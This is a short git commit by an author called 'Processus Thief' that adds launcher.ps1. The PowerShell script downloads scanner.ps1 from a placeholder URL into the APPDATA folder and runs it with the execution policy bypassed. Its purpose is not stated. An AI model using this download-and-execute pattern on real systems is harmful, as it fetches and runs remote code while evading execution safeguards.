83582f826081ce3afbb356412c353a54ad2787e1
Processus Thief <13833925+Processus-Thief@users.noreply.github.com>
2020-12-21 14:11:40 +0100

    Add files via upload

---
+++ launcher.ps1
@@ -0,0 +1,7 @@
+﻿$WebFile = "https://somewhere.on.the.internet/scanner.ps1"
+
+$LocalFile = "$env:APPDATA\scanner.ps1"
+
+Invoke-WebRequest -Uri $WebFile -OutFile $LocalFile   
+
+PowerShell -ExecutionPolicy bypass -File  $LocalFile
